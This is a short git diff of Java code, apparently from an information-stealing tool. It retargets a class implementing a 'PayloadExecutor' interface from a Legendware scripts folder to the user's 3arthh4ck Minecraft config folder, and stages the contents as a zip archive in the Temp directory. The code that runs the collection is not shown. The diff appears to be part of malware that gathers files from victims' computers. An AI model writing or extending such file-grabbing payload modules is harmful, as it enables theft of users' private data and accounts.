@@ -10,15 +10,15 @@ import java.util.Optional;
 
 /**
  * @author Peter
- * @since 09/13/2022
- * Gets Legendware's script folder(since it uses configs from the cloud).
+ * @since 10/09/2022
+ * Gets 3arthh4ck configs.
  */
 
-public class LegendwareScripts implements PayloadExecutor {
+public class EarthhackConfigs implements PayloadExecutor {
     Main main = new Main();
 
-    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Legendware\\Scripts";
-    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofLegend.zip";
+    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\earthhack";
+    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofEarth.zip";
 
     @Override
     public void execute() throws Exception {
